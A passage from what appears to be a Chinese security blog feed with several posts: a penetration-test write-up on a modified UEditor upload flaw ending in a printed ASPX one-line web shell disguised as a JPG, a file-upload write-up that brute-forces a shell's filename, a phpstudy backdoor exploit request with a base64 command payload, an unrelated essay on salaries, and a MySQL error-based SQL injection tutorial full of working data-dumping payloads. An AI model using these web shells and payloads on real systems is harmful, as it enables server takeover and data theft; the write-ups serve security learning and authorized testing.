    <content type="html"><![CDATA[<p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p><p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p><p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg" alt="佛学的魔改Ueditor"></p><a id="more"></a><p>通过fd抓包获取到编辑器路径为：</p><p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p><p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/02.jpg" alt="佛学的魔改Ueditor"></p><p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/03.jpg" alt="佛学的魔改Ueditor"></p><p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/04.jpg" alt="佛学的魔改Ueditor"></p><p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/05.jpg" alt="佛学的魔改Ueditor"></p><p>打开这个js文件，找到了ueditor的真实路径。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/06.jpg" alt="佛学的魔改Ueditor"></p><p>但是去访问的时候，发现地址无法访问。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/07.jpg" alt="佛学的魔改Ueditor"></p><p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/08.jpg" alt="佛学的魔改Ueditor"></p><p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/09.jpg" alt="佛学的魔改Ueditor"></p><p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/10.jpg" alt="佛学的魔改Ueditor"></p><p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/11.jpg" alt="佛学的魔改Ueditor"></p><p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p><p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/12.jpg" alt="佛学的魔改Ueditor"></p><p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p><p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/13.jpg" alt="佛学的魔改Ueditor"></p><p>仔细一看，第一次返回的路径中多了’/‘，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/14.jpg" alt="佛学的魔改Ueditor"></p><p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/15.jpg" alt="佛学的魔改Ueditor"></p><p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>上传成功后，菜刀连接成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/16.jpg" alt="佛学的魔改Ueditor"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次任意文件上传</title>
    <link href="/p/edc6b9c0.html"/>
    <url>/p/edc6b9c0.html</url>
    
    <content type="html"><![CDATA[<p>很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。<br>在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。<br>当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。</p><a id="more"></a><p>看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。</p><p>上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="20191127记一次任意文件上传"><br>修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：<a href="http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b">http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b</a>。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="20191127记一次任意文件上传"><br>经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。<br>此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="20191127记一次任意文件上传"><br>与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。<br>重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="20191127记一次任意文件上传"><br>设置第一个标志位<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="20191127记一次任意文件上传"><br>设置第二个标志位加载生成的0000-9999的4位数字典<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="20191127记一次任意文件上传"><br>经过一段时间后爆破成功。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="20191127记一次任意文件上传"><br>访问会报错，但问题不大，拿shell客户端直接连接<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="20191127记一次任意文件上传"><br>Getshell成功<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="20191127记一次任意文件上传"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpstudy后门利用方法及getshell</title>
    <link href="/p/c3ec4232.html"/>
    <url>/p/c3ec4232.html</url>
    
    <content type="html"><![CDATA[<p>请求任意后缀为php的文件</p><p>目标环境为php5.2,5.4,且不能为nts</p><p>存在Accept-Encoding: gzip,deflate</p><p>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</p><p>PayLoad:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/phpinfo.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.1.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate<span class="hljs-attribute">Sec-Fetch-User</span>: ?1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="hljs-attribute">Sec-Fetch-Site</span>: none,<span class="hljs-attribute">accept-charset</span>: c3lzdGVtKCdjYWxjLmV4ZScpOw<span class="hljs-attribute">Accept-Encoding</span>: gzip,deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20190924_phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell/01.jpg" alt="phpstudy后门利用方法及getshell"></p><p>其他更好玩的思路靠自己去思考</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>莫名的感慨</title>
    <link href="/p/7c8c6805.html"/>
    <url>/p/7c8c6805.html</url>
    
    <content type="html"><![CDATA[<p>在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等</p><p>等工作，到手工资又一万了，反而感觉不高了。</p><p>这是一个正常的现象，这是很多大学生进入社会最深切的感受。</p><p>因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。</p><p>俗话说的好，由俭入奢易，由奢入俭难。</p><a id="more"></a><p><strong>一.学生时代的你</strong></p><p>以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。</p><p>况且给到手的钱都是实实在在的零花钱。</p><p>千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。</p><p>学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。</p><p>一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。</p><p>学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，</p><p>一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。</p><p>特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。</p><p>这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。</p><p><strong>二.毕业以后的你</strong></p><p>1.固定开支大</p><p>每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。</p><p>这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。</p><p>还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。</p><p>还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。</p><p>2.社交开支少不了</p><p>工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，</p><p>就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.</p><p>当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.</p><p>3.日常生活水平也提高</p><p>工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。</p><p>4.人情世故少不了</p><p>在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。</p><p>但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。</p><p>网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。</p><p>这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。</p><p>因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。</p><p>因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习之MYSQL报错注入</title>
    <link href="/p/7a3f5d50.html"/>
    <url>/p/7a3f5d50.html</url>
    
    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><h2 id="MYSQL报错注入分类："><a href="#MYSQL报错注入分类：" class="headerlink" title="MYSQL报错注入分类："></a>MYSQL报错注入分类：</h2><blockquote><p>BIGINT等数据类型溢出</p></blockquote><blockquote><p>xpath语法错误</p></blockquote><blockquote><p>concat+rand()+group_by()导致主键重复</p></blockquote><blockquote><p>一些特性</p></blockquote><p>下面就针对这几种错误类型看看背后的原理是怎样的。</p><h2 id="BIGINT等数据类型溢出"><a href="#BIGINT等数据类型溢出" class="headerlink" title="BIGINT等数据类型溢出"></a>BIGINT等数据类型溢出</h2><p>按位取反<code>~</code>、<code>!</code>、<code>exp()</code>来溢出报错。</p><p>有版本限制，<code>mysql&gt;5.5.53</code>时，则不能返回查询结果。</p><pre><code class="hljs mysql">select exp(~(select*from(select user())x));</code></pre><pre><code class="hljs mysql">select (select(!x-~0)from(select(select user())x)a);</code></pre><p>报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到</p><h2 id="xpath报错"><a href="#xpath报错" class="headerlink" title="xpath报错"></a>xpath报错</h2><p>通过xml函数进行报错，来进行注入。主要涉及2个函数:</p><blockquote><p>1、updatexml()</p></blockquote><blockquote><p>2、extractvalue()</p></blockquote><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。这就是xpath报错注入的原理</p><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><code>updatexml((XML_document, XPath_string, new_value):</code></p><blockquote><p>第一个参数：xml文档的名称</p><p>第二个参数：xpath格式的字符串</p><p>第三个参数：替换查找到的符合条件的数据</p></blockquote><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>必须是在xpath那里传特殊字符，mysql才会报错，而我们又要注出数据，没这么多位置，所以要用到concat函数</li><li>xpath只会对特殊字符进行报错，这里我们可以用~，16进制的0x7e来进行利用</li><li>xpath只会报错32个字符，所以要用到substr</li></ul><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li>爆数据库版本</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,version(),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png" alt="img"></p><ul><li>爆所有数据库</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,32) from information_schema.schemata)),0x7e)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png" alt="img"></p><p>但是报错长度有限制，可以使用<code>limit</code>来偏移</p><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(schema_name,1,32) from information_schema.schemata limit 4,1)),0x7e)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png" alt="img"></p><ul><li>爆所有表</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png" alt="img"></p><ul><li>爆所有列</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,32) from information_schema.columns where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png" alt="img"></p><ul><li>爆数据</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(username),1,32) from users),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png" alt="img"></p><h3 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h3><p><code>extractvalue(xml_str , Xpath)</code><br>第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径</p><p>还是对第二个参数xpath传入特殊字符，让它报错，跟updatexml的payload差不多，只不过一个是3个参数，一个是两个，这里就不详细列出来了</p><pre><code class="hljs mysql">extractvalue(1,concat(0x7e,version(),1))</code></pre><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><pre><code class="hljs mysql">mysql&gt; select count(*) from user group by concat(version(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;5.1.60-community-log1&#39; for key &#39;group_key&#39;</code></pre><pre><code class="hljs mysql">mysql&gt; select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</code></pre><p>只要是<code>count</code>，<code>rand()</code>，<code>group by</code>三个连用就会造成这种报错，与位置无关。</p><h2 id="函数特性报错"><a href="#函数特性报错" class="headerlink" title="函数特性报错"></a>函数特性报错</h2><p><code>在版本号为5.5.47上可以用来注入，而在5.7.17上则不行</code></p><ul><li>geometrycollection()</li></ul><pre><code class="hljs mysql">and geometrycollection((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipoint()</li></ul><pre><code class="hljs mysql">and multipoint((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>polygon()</li></ul><pre><code class="hljs mysql">and polygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipolygon()</li></ul><pre><code class="hljs mysql">and multipolygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>linestring()</li></ul><pre><code class="hljs mysql">and linestring((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multilinestring()</li></ul><pre><code class="hljs mysql">and multilinestring((select * from(select * from(select user())a)b))-- +</code></pre><h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><p>如果程序过滤information_schema，无法获取表名，利用polygon()进行绕过，括号里填上存在的列名(一般都有id这个列)，即可爆出表名</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>报错注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习之MYSQL盲注</title>
    <link href="/p/3f4fbe96.html"/>
    <url>/p/3f4fbe96.html</url>
    
